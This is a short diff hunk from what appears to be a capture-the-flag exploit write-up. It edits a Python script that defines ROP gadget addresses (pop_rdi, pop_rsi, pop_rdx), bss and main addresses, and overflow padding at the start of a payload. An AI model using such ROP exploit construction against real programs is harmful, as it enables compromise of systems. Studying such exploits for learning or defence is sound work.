@@ -24,8 +24,8 @@ icon: icon-html
   pop_rdi = 0x400686
   pop_rsi = 0x4101f3
   pop_rdx = 0x4498b5
-  bss = 0x6BC6E7
-  main_addr = 0x400BC1
+  bss = 0x6bb2e0
+  main_addr = 0x400bc1
   padding = 'a'*0x400 + 'b'*0x8
   
   payload  = padding
